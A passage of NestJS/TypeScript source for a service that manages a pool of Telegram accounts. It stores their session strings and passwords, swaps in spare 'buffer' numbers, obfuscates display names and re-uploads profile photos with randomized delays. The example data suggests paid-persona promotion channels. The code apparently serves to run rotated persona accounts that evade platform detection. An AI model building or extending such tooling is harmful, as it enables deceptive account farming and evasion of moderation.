  mobileNumber: { type: 'string', example: '916265240911' },\r\n      },\r\n    },\r\n  })\r\n  @ApiResponse({ description: 'Promote mobile assignment removed successfully.', type: Client })\r\n  async removePromoteMobile(@Param('clientId') clientId: string, @Body() body: { mobileNumber: string }) {\r\n    return await this.clientService.removePromoteMobile(clientId, body.mobileNumber);\r\n  }\r\n}","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { Client, ClientSchema } from './schemas/client.schema';\nimport { ClientService } from './client.service';\nimport { ClientController } from './client.controller';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { UsersModule } from '../users/users.module';\nimport { InitModule } from '../ConfigurationInit/init.module';\nimport { NpointModule } from '../n-point/npoint.module';\nimport { TimestampModule } from '../timestamps/timestamp.module';\nimport { SessionModule } from '../session-manager';\nimport { PromoteClientModule } from '../promote-clients/promote-client.module';\nimport { PromoteClient, PromoteClientSchema } from '../promote-clients';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ name: Client.name, schema: ClientSchema }]),\n    MongooseModule.forFeature([{ name: PromoteClient.name, schema: PromoteClientSchema, collection: 'promoteClients' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => BufferClientModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => SessionModule),\n    forwardRef(() => TimestampModule),\n    forwardRef(() => PromoteClientModule),\n    NpointModule\n  ],\n  controllers: [ClientController],\n  providers: [ClientService],\n  exports: [ClientService, MongooseModule]\n})\nexport class ClientModule {}\n","import {\n  BadRequestException,\n  Inject,\n  Injectable,\n  InternalServerErrorException,\n  NotFoundException,\n  forwardRef,\n  OnModuleDestroy,\n  OnModuleInit,\n} from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Client, ClientDocument } from './schemas/client.schema';\nimport { CreateClientDto } from './dto/create-client.dto';\nimport { SetupClientQueryDto } from './dto/setup-client.dto';\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport {\n  getCuteEmoji,\n  getReadableTimeDifference,\n  Logger,\n  obfuscateText,\n  toBoolean,\n} from '../../utils';\nimport { UpdateClientDto } from './dto/update-client.dto';\nimport { CreateBufferClientDto } from '../buffer-clients/dto/create-buffer-client.dto';\nimport { UpdateBufferClientDto } from '../buffer-clients/dto/update-buffer-client.dto';\nimport { CloudinaryService } from '../../cloudinary';\nimport { SearchClientDto } from './dto/search-client.dto';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { connectionManager } from '../Telegram/utils/connection-manager';\nimport {\n  PromoteClient,\n  PromoteClientDocument,\n} from '../promote-clients/schemas/promote-client.schema';\nimport path from 'path';\nimport { Api } from 'telegram/tl';\nimport isPermanentError from '../../utils/isPermanentError';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport TelegramManager from '../Telegram/TelegramManager';\nimport { User } from '../users';\nimport { isIncludedWithTolerance, safeAttemptReverse } from '../../utils/checkMe.utils';\n\n// Configuration constants\nconst CONFIG = {\n  REFRESH_INTERVAL: 5 * 60 * 1000, // 5 minutes\n  CACHE_TTL: 10 * 60 * 1000, // 10 minutes\n  MAX_RETRIES: 3,\n  RETRY_DELAY: 1000, // 1 second\n  CACHE_WARMUP_THRESHOLD: 20,\n  COOLDOWN_PERIOD: 240000, // 4 minutes\n  UPDATE_CLIENT_COOLDOWN: 30000, // 30 seconds\n  PHOTO_PATHS: ['dp1.jpg', 'dp2.jpg', 'dp3.jpg'],\n};\n\ninterface CacheMetadata {\n  lastUpdated: number;\n  isStale: boolean;\n}\n\ninterface SearchResult {\n  clients: Client[];\n  searchType: 'direct' | 'promoteMobile' | 'mixed';\n  promoteMobileMatches?: Array<{ clientId: string; mobile: string }>;\n}\n\n@Injectable()\nexport class ClientService implements OnModuleDestroy, OnModuleInit {\n  private readonly logger = new Logger(ClientService.name);\n  private lastUpdateMap: Map<string, number> = new Map();\n  private setupCooldownMap: Map<string, number> = new Map();\n  private clientsMap: Map<string, Client> = new Map();\n  private cacheMetadata: CacheMetadata = { lastUpdated: 0, isStale: true };\n  private checkInterval: NodeJS.Timeout | null = null;\n  private refreshInterval: NodeJS.Timeout | null = null;\n  private isInitialized = false;\n  private isShuttingDown = false;\n  private refreshPromise: Promise<void> | null = null;\n\n  constructor(\n    @InjectModel(Client.name) private readonly clientModel: Model<ClientDocument>,\n    @InjectModel(PromoteClient.name)\n    private readonly promoteClientModel: Model<PromoteClientDocument>,\n    @Inject(forwardRef(() => TelegramService))\n    private readonly telegramService: TelegramService,\n    @Inject(forwardRef(() => BufferClientService))\n    private readonly bufferClientService: BufferClientService,\n    @Inject(forwardRef(() => UsersService))\n    private readonly usersService: UsersService,\n  ) { }\n\n  async onModuleInit(): Promise<void> {\n    try {\n      await this.refreshCacheFromDatabase();\n      this.startPeriodicTasks();\n      this.isInitialized = true;\n    } catch (e) {\n      parseError(e, 'Failed to initialize Client Service')\n    }\n  }\n\n  async onModuleDestroy(): Promise<void> {\n    this.isShuttingDown = true;\n    try {\n      if (this.checkInterval) clearInterval(this.checkInterval);\n      if (this.refreshInterval) clearInterval(this.refreshInterval);\n      if (this.refreshPromise) await this.refreshPromise;\n      await connectionManager.shutdown();\n      this.clientsMap.clear();\n    } catch (e) {\n      parseError(e, 'Error during Client Service shutdown');\n    }\n  }\n\n  private startPeriodicTasks(): void {\n    this.checkInterval = setInterval(async () => {\n      if (this.isShuttingDown) return;\n      await this.performPeriodicRefresh();\n    }, CONFIG.REFRESH_INTERVAL);\n\n    this.refreshInterval = setInterval(() => {\n      if (this.isShuttingDown) return;\n      this.updateCacheMetadata();\n    }, 60000);\n  }\n\n  private async performPeriodicRefresh(): Promise<void> {\n    if (this.refreshPromise) {\n      this.logger.debug('Refresh already in progress, skipping...');\n      return;\n    }\n    this.refreshPromise = this.refreshCacheFromDatabase();\n    try {\n      await this.refreshPromise;\n    } finally {\n      this.refreshPromise = null;\n    }\n  }\n\n  private updateCacheMetadata(): void {\n    this.cacheMetadata.isStale = Date.now() - this.cacheMetadata.lastUpdated > CONFIG.CACHE_TTL;\n  }\n\n  private async refreshCacheFromDatabase(): Promise<void> {\n    try {\n      const documents = await this.executeWithRetry(() =>\n        this.clientModel.find({}, { _id: 0, updatedAt: 0 }).lean().exec(),\n      );\n      const newClientsMap = new Map<string, Client>();\n      documents.forEach((client) => newClientsMap.set(client.clientId, client));\n      this.clientsMap = newClientsMap;\n      this.cacheMetadata = { lastUpdated: Date.now(), isStale: false };\n    } catch (e) {\n      parseError(e, 'Failed to refresh clients cache from database', true);\n    }\n  }\n\n  async create(createClientDto: CreateClientDto): Promise<Client> {\n    try {\n      const createdClient = await this.executeWithRetry(() => {\n        const client = new this.clientModel(createClientDto);\n        return client.save();\n      });\n      this.clientsMap.set(createdClient.clientId, createdClient.toObject());\n      this.logger.log(`Client created: ${createdClient.clientId}`);\n      return createdClient;\n    } catch (error) {\n      const errorDetails = parseError(error, `Failed to create client | mobile: ${createClientDto.mobile}`);\n      throw new BadRequestException(errorDetails.message);\n    }\n  }\n\n  async findAll(): Promise<Client[]> {\n    this.ensureInitialized();\n    if (\n      this.clientsMap.size >= CONFIG.CACHE_WARMUP_THRESHOLD &&\n      !this.cacheMetadata.isStale\n    ) {\n      this.logger.debug(`Retrieved ${this.clientsMap.size} clients from cache`);\n      return Array.from(this.clientsMap.values());\n    }\n    await this.refreshCacheFromDatabase();\n    return Array.from(this.clientsMap.values());\n  }\n\n  async findAllMasked(): Promise<Partial<Client>[]> {\n    const clients = await this.findAll();\n    return clients.map(({ session, mobile, password, ...maskedClient }) => maskedClient);\n  }\n\n  async findOneMasked(clientId: string): Promise<Partial<Client>> {\n    const client = await this.findOne(clientId, true);\n    const { session, mobile, password, ...maskedClient } = client;\n    return maskedClient;\n  }\n\n  async findAllObject(): Promise<Record<string, Client>> {\n    const clients = await this.findAll();\n    return clients.reduce((acc, client) => {\n      acc[client.clientId] = client;\n      return acc;\n    }, {} as Record<string, Client>);\n  }\n\n  async findAllMaskedObject(query?: SearchClientDto): Promise<Record<string, Partial<Client>>> {\n    const filteredClients = query ? (await this.enhancedSearch(query)).clients : await this.findAll();\n    return filteredClients.reduce((acc, client) => {\n      const { session, mobile, password, ...maskedClient } = client;\n      acc[client.clientId] = { clientId: client.clientId, ...maskedClient };\n      return acc;\n    }, {} as Record<string, Partial<Client>>);\n  }\n\n  async refreshMap(): Promise<void> {\n    this.logger.log('Manual cache refresh requested');\n    await this.refreshCacheFromDatabase();\n  }\n\n  async findOne(clientId: string, throwErr: boolean = true): Promise<Client | null> {\n    this.ensureInitialized();\n    const cachedClient = this.clientsMap.get(clientId);\n    if (cachedClient) return cachedClient;\n    const client = await this.executeWithRetry(() =>\n      this.clientModel.findOne({ clientId }, { _id: 0, updatedAt: 0 }).lean().exec(),\n    );\n    if (!client && throwErr) {\n      throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n    }\n    if (client) this.clientsMap.set(clientId, client);\n    return client;\n  }\n\n  async update(clientId: string, updateClientDto: UpdateClientDto): Promise<Client> {\n    this.ensureInitialized();\n    try {\n      const cleanUpdateDto = this.cleanUpdateObject(updateClientDto);\n      await this.notifyClientUpdate(clientId);\n      const updatedClient = await this.executeWithRetry(() =>\n        this.clientModel\n          .findOneAndUpdate(\n            { clientId },\n            { $set: cleanUpdateDto },\n            { new: true, upsert: true, runValidators: true },\n          )\n          .lean()\n          .exec(),\n      );\n      if (!updatedClient) {\n        throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n      }\n      this.clientsMap.set(clientId, updatedClient);\n      this.performPostUpdateTasks(updatedClient);\n      this.logger.log(`Client updated: ${clientId}`);\n      return updatedClient;\n    } catch (error) {\n      const errorDetails = parseError(error, `Failed to update client ${clientId} | mobile: ${updateClientDto.mobile || 'N/A'}`);\n      throw new BadRequestException(errorDetails.message);\n    }\n  }\n\n  async remove(clientId: string): Promise<Client> {\n    this.ensureInitialized();\n    try {\n      const deletedClient = await this.executeWithRetry(() =>\n        this.clientModel.findOneAndDelete({ clientId }).lean().exec(),\n      );\n      if (!deletedClient) {\n        throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n      }\n      this.clientsMap.delete(clientId);\n      this.logger.log(`Client removed: ${clientId}`);\n      return deletedClient;\n    } catch (error) {\n      const errorDetails = parseError(error, `Failed to remove client ${clientId}`);\n      throw new InternalServerErrorException(errorDetails.message);\n    };\n  }\n\n  async search(filter: any): Promise<Client[]> {\n    try {\n      if (filter.hasPromoteMobiles !== undefined) {\n        filter = await this.processPromoteMobileFilter(filter);\n      }\n      filter = this.processTextSearchFields(filter);\n      return this.executeWithRetry(() => this.clientModel.find(filter).lean().exec());\n    } catch (error) {\n      const errorDetails = parseError(error, `Failed to search clients with filter ${JSON.stringify(filter)}`);\n      throw new InternalServerErrorException(errorDetails.message);\n    }\n  }\n\n  async searchClientsByPromoteMobile(mobileNumbers: string[]): Promise<Client[]> {\n    if (!Array.isArray(mobileNumbers) || mobileNumbers.length === 0) return [];\n    const promoteClients = await this.executeWithRetry(() =>\n      this.promoteClientModel\n        .find({ mobile: { $in: mobileNumbers }, clientId: { $exists: true } })\n        .lean()\n        .exec(),\n    );\n    const clientIds = [...new Set(promoteClients.map((pc) => pc.clientId))];\n    return this.executeWithRetry(() =>\n      this.clientModel.find({ clientId: { $in: clientIds } }).lean().exec(),\n    );\n  }\n\n  async enhancedSearch(filter: any): Promise<SearchResult> {\n    try {\n      let searchType: 'direct' | 'promoteMobile' | 'mixed' = 'direct';\n      let promoteMobileMatches: Array<{ clientId: string; mobile: string }> = [];\n      if (filter.promoteMobileNumber) {\n        searchType = 'promoteMobile';\n        const mobileNumber = filter.promoteMobileNumber;\n        delete filter.promoteMobileNumber;\n        const promoteClients = await this.executeWithRetry(() =>\n          this.promoteClientModel\n            .find({\n              mobile: { $regex: new RegExp(this.escapeRegex(mobileNumber), 'i') },\n              clientId: { $exists: true },\n            })\n            .lean()\n            .exec(),\n        );\n        promoteMobileMatches = promoteClients.map((pc) => ({\n          clientId: pc.clientId,\n          mobile: pc.mobile,\n        }));\n        filter.clientId = { $in: promoteClients.map((pc) => pc.clientId) };\n      }\n      const clients = await this.search(filter);\n      return {\n        clients,\n        searchType,\n        promoteMobileMatches: promoteMobileMatches.length > 0 ? promoteMobileMatches : undefined,\n      };\n    } catch (error) {\n      const errorDetails = parseError(error, `Failed to perform enhanced search with filter ${JSON.stringify(filter)}`);\n      throw new InternalServerErrorException(errorDetails.message);\n    }\n  }\n\n  private ensureInitialized(): void {\n    if (!this.isInitialized) {\n      throw new Error('Service not initialized. Please wait for initialization to complete.');\n    }\n  }\n\n  private cleanUpdateObject(updateDto: any): any {\n    const cleaned = { ...updateDto };\n    delete cleaned._id;\n    if (cleaned._doc) {\n      delete cleaned._doc._id;\n      delete cleaned._doc;\n    }\n    return cleaned;\n  }\n\n  private async notifyClientUpdate(clientId: string): Promise<void> {\n    await this.notify(`Updating the Existing client: ${clientId}`);\n  }\n\n  private async notify(message: string): Promise<void> {\n    try {\n      await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(message)}`, {\n        timeout: 5000,\n      });\n    } catch (error) {\n      this.logger.warn('Failed to send notification', error.message);\n    }\n  }\n\n  private performPostUpdateTasks(updatedClient: Client): void {\n    setImmediate(async () => {\n      try {\n        this.refreshExternalMaps()\n      } catch (error) {\n        parseError(error, 'Failed to refresh external maps after client update');\n      }\n    });\n  }\n\n  private async refreshExternalMaps(): Promise<void> {\n    await Promise.allSettled([\n      fetchWithTimeout(`${process.env.uptimeChecker}/refreshmap`, { timeout: 5000 }),\n      fetchWithTimeout(`${process.env.uptimebot}/refreshmap`, { timeout: 5000 }),\n    ]);\n    this.logger.debug('External maps refreshed');\n  }\n\n  private async processPromoteMobileFilter(filter: any): Promise<any> {\n    const hasPromoteMobiles = filter.hasPromoteMobiles.toLowerCase() === 'true';\n    delete filter.hasPromoteMobiles;\n    const clientsWithPromoteMobiles = await this.executeWithRetry(() =>\n      this.promoteClientModel.find({ clientId: { $exists: true } }).distinct('clientId').lean(),\n    );\n    filter.clientId = hasPromoteMobiles\n      ? { $in: clientsWithPromoteMobiles }\n      : { $nin: clientsWithPromoteMobiles };\n    return filter;\n  }\n\n  private processTextSearchFields(filter: any): any {\n    const textFields = ['firstName', 'name'];\n    textFields.forEach((field) => {\n      if (filter[field]) {\n        filter[field] = { $regex: new RegExp(this.escapeRegex(filter[field]), 'i') };\n      }\n    });\n    return filter;\n  }\n\n  private escapeRegex(text: string): string {\n    return text.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&');\n  }\n\n  private async executeWithRetry<T>(operation: () => Promise<T>, retries = CONFIG.MAX_RETRIES): Promise<T> {\n    for (let attempt = 1; attempt <= retries; attempt++) {\n      try {\n        return await operation();\n      } catch (error) {\n        this.logger.warn(`Operation failed on attempt ${attempt}/${retries}`, error.message);\n        if (attempt === retries) throw error;\n        const delay = CONFIG.RETRY_DELAY * Math.pow(2, attempt - 1);\n        await this.sleep(delay);\n      }\n    }\n    throw new Error('All retry attempts failed');\n  }\n\n  private sleep(ms: number): Promise<void> {\n    return new Promise((resolve) => setTimeout(resolve, ms));\n  }\n\n  getServiceStatus(): {\n    isInitialized: boolean;\n    cacheSize: number;\n    lastCacheUpdate: Date;\n    isCacheStale: boolean;\n    isShuttingDown: boolean;\n  } {\n    return {\n      isInitialized: this.isInitialized,\n      cacheSize: this.clientsMap.size,\n      lastCacheUpdate: new Date(this.cacheMetadata.lastUpdated),\n      isCacheStale: this.cacheMetadata.isStale,\n      isShuttingDown: this.isShuttingDown,\n    };\n  }\n\n  async getCacheStatistics(): Promise<{\n    totalClients: number;\n    cacheHitRate: number;\n    lastRefresh: Date;\n    memoryUsage: number;\n  }> {\n    const totalClients = await this.clientModel.countDocuments().exec();\n    return {\n      totalClients,\n      cacheHitRate: this.clientsMap.size > 0 ? (this.clientsMap.size / totalClients) * 100 : 0,\n      lastRefresh: new Date(this.cacheMetadata.lastUpdated),\n      memoryUsage: process.memoryUsage().heapUsed / 1024 / 1024,\n    };\n  }\n\n  async setupClient(clientId: string, setupClientQueryDto: SetupClientQueryDto) {\n    this.logger.log(`Received New Client Request for - ${clientId}`);\n    if (!toBoolean(process.env.AUTO_CLIENT_SETUP)) {\n      this.logger.log('Auto client setup disabled');\n      return;\n    }\n    if (!this.canSetupClient(clientId)) {\n      this.logger.log(\n        `Profile Setup Recently tried for ${clientId}, wait ::`,\n        getReadableTimeDifference(this.setupCooldownMap.get(clientId)!),\n      );\n      return;\n    }\n    await this.handleSetupClient(clientId, setupClientQueryDto);\n  }\n\n  private canSetupClient(clientId: string): boolean {\n    const lastSetup = this.setupCooldownMap.get(clientId) || 0;\n    return Date.now() > lastSetup + CONFIG.COOLDOWN_PERIOD;\n  }\n\n  private async handleSetupClient(clientId: string, setupClientQueryDto: SetupClientQueryDto) {\n    this.setupCooldownMap.set(clientId, Date.now());\n    const existingClient = await this.findOne(clientId);\n    if (!existingClient) {\n      this.logger.error(`Client not found: ${clientId}`);\n      return;\n    }\n    const existingClientMobile = existingClient.mobile;\n    this.logger.log('setupClientQueryDto:', setupClientQueryDto);\n    const today = new Date().toISOString().split('T')[0];\n    const query = {\n      clientId,\n      mobile: { $ne: existingClientMobile },\n      createdAt: { $lte: new Date(Date.now() - 15 * 24 * 60 * 60 * 1000) },\n      availableDate: { $lte: today },\n      channels: { $gt: 200 },\n      status: \"active\"\n    };\n    const newBufferClient = (await this.bufferClientService.executeQuery(query, { tgId: 1 }))[0];\n    if (!newBufferClient) {\n      await this.notify(`Buffer Clients not available, Requested by ${clientId}`);\n      this.logger.log('Buffer Clients not available');\n      return;\n    }\n    try {\n      await this.notify(\n        `Received New Client Request for - ${clientId}\\nOldNumber: ${existingClient.mobile}\\nOldUsername: @${existingClient.username}`,\n      );\n      this.telegramService.setActiveClientSetup({\n        ...setupClientQueryDto,\n        clientId,\n        existingMobile: existingClientMobile,\n        newMobile: newBufferClient.mobile,\n      });\n      await connectionManager.getClient(newBufferClient.mobile);\n      await this.updateClientSession(newBufferClient.session);\n    } catch (error) {\n      await this.notify(\n        `Failed to setup new Client for - ${clientId}\\nOldNumber: ${existingClient.mobile}\\nError: ${error.message}`,\n      );\n      const availableDate = new Date(Date.now() + 3 * 24 * 60 * 60 * 1000).toISOString().split('T')[0];\n      await this.bufferClientService.createOrUpdate(newBufferClient.mobile, { availableDate });\n      this.telegramService.setActiveClientSetup(undefined);\n    } finally {\n      await connectionManager.unregisterClient(newBufferClient.mobile);\n    }\n  }\n\n  async updateClientSession(newSession: string) {\n    const setup = this.telegramService.getActiveClientSetup();\n    const { days, archiveOld, clientId, existingMobile, formalities, newMobile } = setup;\n    this.logger.log('Updating Client Session');\n    await sleep(2000);\n    const existingClient = await this.findOne(clientId);\n    if (!existingClient) throw new NotFoundException(`Client ${clientId} not found`);\n    let newTelegramClient: TelegramManager;\n    try {\n      newTelegramClient = await connectionManager.getClient(newMobile, {\n        handler: true,\n        autoDisconnect: false,\n      });\n    } catch (error) {\n      const errorDetails = parseError(error, `Failed to get Telegram client for NewMobile: ${newMobile}`, true);\n      if (isPermanentError(errorDetails)) {\n        await this.bufferClientService.markAsInactive(newMobile, errorDetails.message);\n      }\n      throw error;\n    }\n    if (!newTelegramClient) throw new Error(`Failed to get Telegram client for NewMobile: ${newMobile}`);\n    try {\n      const me = await newTelegramClient.getMe();\n      const updatedUsername = await this.telegramService.updateUsernameForAClient(\n        newMobile,\n        clientId,\n        existingClient.name,\n        me.username,\n      );\n      await this.notify(`Updated username for NewNumber: ${newMobile}\\noldUsername: @${me.username}\\nNewUsername: @${updatedUsername}`);\n      await this.update(clientId, { mobile: newMobile, username: updatedUsername, session: newSession });\n      await fetchWithTimeout(existingClient.deployKey, {}, 1);\n      setTimeout(() => this.updateClient(clientId, 'Delayed update after buffer removal'), 15000);\n      await this.handleClientArchival(existingClient, existingMobile, formalities, archiveOld, days);\n      await this.bufferClientService.update(newMobile, { inUse: true, lastUsed: new Date() });\n      await this.notify('Update finished');\n    } catch (error) {\n      parseError(error, `[New: ${newMobile}] Error in updating client session`, true);\n      throw error;\n    } finally {\n      await connectionManager.unregisterClient(newMobile);\n      this.telegramService.setActiveClientSetup(undefined);\n    }\n  }\n\n  private async handleClientArchival(\n    existingClient: Client,\n    existingMobile: string,\n    formalities: boolean,\n    archiveOld: boolean,\n    days: number,\n  ) {\n    try {\n      const existingClientUser = (await this.usersService.search({ mobile: existingMobile }))[0];\n      if (!existingClientUser) return;\n      if (toBoolean(formalities)) {\n        await this.handleFormalities(existingMobile);\n      } else {\n        this.logger.log('Formalities skipped');\n      }\n      if (archiveOld) {\n        await this.archiveOldClient(existingClient, existingClientUser, existingMobile, days);\n      } else {\n        await this.bufferClientService.update(existingMobile, {\n          inUse: false,\n          lastUsed: new Date(),\n          status: 'inactive',\n        });\n        this.logger.log('Client Archive Skipped');\n        await this.notify('Skipped Old Client Archival');\n      }\n    } catch (e) {\n      const errorDetails = parseError(e, `Error in Archiving Old Client: ${existingMobile}`, false);\n      if (isPermanentError(errorDetails)) {\n        await this.bufferClientService.markAsInactive(existingMobile, e.errorMessage || e.message);\n      }\n      await this.notify(`Failed to Archive old Client: ${existingMobile}\\nError: ${e.errorMessage || e.message}`);\n    }\n  }\n\n  private async handleFormalities(mobile: string) {\n    const client = await connectionManager.getClient(mobile, { handler: true, autoDisconnect: false });\n    await this.telegramService.updatePrivacyforDeletedAccount(mobile);\n    this.logger.log('Formalities finished');\n    await connectionManager.unregisterClient(mobile);\n    await this.notify('Formalities finished');\n  }\n\n  private async archiveOldClient(\n    existingClient: Client,\n    existingClientUser: User,\n    existingMobile: string,\n    days: number,\n  ) {\n    try {\n      const availableDate = new Date(Date.now() + (days + 1) * 24 * 60 * 60 * 1000)\n        .toISOString()\n        .split('T')[0];\n      const bufferClientDto: CreateBufferClientDto | UpdateBufferClientDto = {\n        clientId: existingClient.clientId,\n        mobile: existingMobile,\n        availableDate,\n        session: existingClient.session,\n        tgId: existingClientUser.tgId,\n        channels: 170,\n        status: days > 35 ? 'inactive' : 'active',\n        inUse: false,\n      };\n      const updatedBufferClient = await this.bufferClientService.createOrUpdate(\n        existingMobile,\n        bufferClientDto,\n      );\n      this.logger.log('client Archived: ', updatedBufferClient['_doc']);\n      await this.notify('old Client Archived');\n    } catch (error) {\n      const errorDetails = parseError(error, `Error in Archiving Old Client: ${existingMobile}`, true);\n      await this.notify(errorDetails.message);\n      if (isPermanentError(errorDetails)) {\n        this.logger.log('Deleting User: ', existingClientUser.mobile);\n        await this.bufferClientService.markAsInactive(existingClientUser.mobile, errorDetails.message);\n        // await this.bufferClientService.remove(existingClientUser.mobile, 'Deactivated user');\n      } else {\n        this.logger.log('Not Deleting user');\n      }\n    }\n  }\n\n  async updateClient(clientId: string, message: string = '') {\n    this.logger.log(`Updating Client: ${clientId} - ${message}`);\n    if (!this.canUpdateClient(clientId)) return;\n    const client = await this.findOne(clientId);\n    if (!client) {\n      this.logger.error(`Client not found: ${clientId}`);\n      return;\n    }\n    try {\n      this.lastUpdateMap.set(clientId, Date.now());\n      const telegramClient = await connectionManager.getClient(client.mobile, { handler: false });\n      if (!telegramClient) throw new Error(`Unable to fetch Telegram client for ${client.mobile}`);\n      await sleep(2000);\n      const me = await telegramClient.getMe();\n      if (!me) throw new Error(`Unable to fetch 'me' for ${clientId}`);\n      await this.updateClientUsername(client, me);\n      await this.updateClientName(client, telegramClient, me);\n      await this.updateClientPrivacy(client, telegramClient);\n      await this.updateClientPhotos(client, telegramClient);\n      await this.notify(`Updated Client: ${clientId} - ${message}`);\n      if (client.deployKey) await fetchWithTimeout(client.deployKey);\n    } catch (error) {\n      this.lastUpdateMap.delete(clientId);\n      parseError(error, `[${clientId}] [${client.mobile}] updateClient failed`);\n      this.bufferClientService.update(client.mobile, { inUse: false, status: 'inactive' });\n    } finally {\n      await connectionManager.unregisterClient(client.mobile);\n    }\n  }\n\n  private canUpdateClient(clientId: string): boolean {\n    const lastUpdate = this.lastUpdateMap.get(clientId) || 0;\n    if (Date.now() - lastUpdate < CONFIG.UPDATE_CLIENT_COOLDOWN) {\n      const waitTime = Math.ceil((CONFIG.UPDATE_CLIENT_COOLDOWN - (Date.now() - lastUpdate)) / 1000);\n      this.logger.log(\n        `Skipping update for ${clientId} - cooldown not elapsed. Try again in ${waitTime} seconds`,\n      );\n      return false;\n    }\n    return true;\n  }\n\n  private async updateClientUsername(client: Client, me: Api.User) {\n    const updatedUsername = await this.telegramService.updateUsernameForAClient(\n      client.mobile,\n      client.clientId,\n      client.name,\n      me.username,\n    );\n    if (updatedUsername) {\n      await this.update(client.clientId, { username: updatedUsername });\n      this.logger.log(`[${client.clientId}] Username updated to: ${updatedUsername}`);\n      await sleep(10000);\n    } else {\n      this.logger.warn(`[${client.clientId}] Failed to update username`);\n    }\n  }\n\n  private async updateClientName(client: Client, tgManager: TelegramManager, me: Api.User) {\n    if (!isIncludedWithTolerance(safeAttemptReverse(me?.firstName), client.name)) {\n      this.logger.log(`[${client.clientId}] Name mismatch. Actual: ${me.firstName}, Expected: ${client.name}`);\n      await tgManager.updateProfile(\n        `${obfuscateText(client.name, {\n          maintainFormatting: false,\n          preserveCase: true,\n          useInvisibleChars: false\n        })} ${getCuteEmoji()}`, ''\n      );\n      await sleep(5000);\n    } else {\n      this.logger.log(`[${client.clientId}] Name already correct`);\n    }\n  }\n\n  private async updateClientPrivacy(client: Client, tgManager: TelegramManager) {\n    await tgManager.updatePrivacy();\n    this.logger.log(`[${client.clientId}] Privacy settings updated`);\n    await sleep(5000);\n  }\n\n  private async updateClientPhotos(client: Client, telegramClient: TelegramManager) {\n    const photos = await telegramClient.client.invoke(\n      new Api.photos.GetUserPhotos({ userId: 'me', offset: 0 }),\n    );\n    const photoCount = photos?.photos?.length || 0;\n    if (photoCount < 2) {\n      this.logger.warn(`[${client.clientId}] No profile photos found. Uploading new ones...`);\n      if (photoCount > 0) await telegramClient.deleteProfilePhotos();\n      await CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());\n      await sleep(6000 + Math.random() * 3000);\n      for (const photo of CONFIG.PHOTO_PATHS) {\n        await telegramClient.updateProfilePic(path.join(process.cwd(), photo));\n        this.logger.debug(`[${client.clientId}] Uploaded profile photo: ${photo}`);\n        await sleep(20000 + Math.random() * 15000);\n      }\n    } else {\n      this.logger.log(`[${client.clientId}] Profile photos already exist (${photoCount})`);\n    }\n  }\n\n  async updateClients() {\n    const clients = await this.findAll();\n    for (const client of clients) {\n      await this.updateClient(client.clientId, `Force Updating Client: ${client.clientId}`);\n    }\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<Client[]> {\n    if (!query) throw new BadRequestException('Query is invalid.');\n    const queryExec = this.clientModel.find(query);\n    if (sort) queryExec.sort(sort);\n    if (limit) queryExec.limit(limit);\n    if (skip) queryExec.skip(skip);\n    return queryExec.exec();\n  }\n\n  async getPromoteMobiles(clientId: string): Promise<string[]> {\n    if (!clientId) throw new BadRequestException('ClientId is required');\n    const promoteClients = await this.promoteClientModel.find({ clientId }).lean();\n    return promoteClients.map((pc) => pc.mobile).filter((mobile) => mobile);\n  }\n\n  async getAllPromoteMobiles(): Promise<string[]> {\n    const allPromoteClients = await this.promoteClientModel\n      .find({ clientId: { $exists: true } })\n      .lean();\n    return allPromoteClients.map((pc) => pc.mobile);\n  }\n\n  async isPromoteMobile(mobile: string): Promise<{ isPromote: boolean; clientId?: string }> {\n    const promoteClient = await this.promoteClientModel.findOne({ mobile }).lean();\n    return {\n      isPromote: !!promoteClient && !!promoteClient.clientId,\n      clientId: promoteClient?.clientId,\n    };\n  }\n\n  async addPromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\n    const client = await this.clientModel.findOne({ clientId }).lean();\n    if (!client) throw new NotFoundException(`Client ${clientId} not found`);\n    const existingPromoteClient = await this.promoteClientModel.findOne({ mobile: mobileNumber }).lean();\n    if (existingPromoteClient) {\n      if (existingPromoteClient.clientId === clientId) {\n        throw new BadRequestException(\n          `Mobile ${mobileNumber} is already a promote mobile for client ${clientId}`,\n        );\n      } else if (existingPromoteClient.clientId) {\n        throw new BadRequestException(\n          `Mobile ${mobileNumber} is already assigned to client ${existingPromoteClient.clientId}`,\n        );\n      } else {\n        await this.promoteClientModel.updateOne({ mobile: mobileNumber }, { $set: { clientId } });\n      }\n    } else {\n      throw new NotFoundException(\n        `Mobile ${mobileNumber} not found in PromoteClient collection. Please add it first.`,\n      );\n    }\n    return client;\n  }\n\n  async removePromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\n    const client = await this.clientModel.findOne({ clientId }).lean();\n    if (!client) throw new NotFoundException(`Client ${clientId} not found`);\n    const result = await this.promoteClientModel.updateOne(\n      { mobile: mobileNumber, clientId },\n      { $unset: { clientId: 1 } },\n    );\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(\n        `Mobile ${mobileNumber} is not a promote mobile for client ${clientId}`,\n      );\n    }\n    return client;\n  }\n}","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateClientDto {\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\n    readonly channelLink: string;\n\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\n    readonly dbcoll: string;\n\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\n 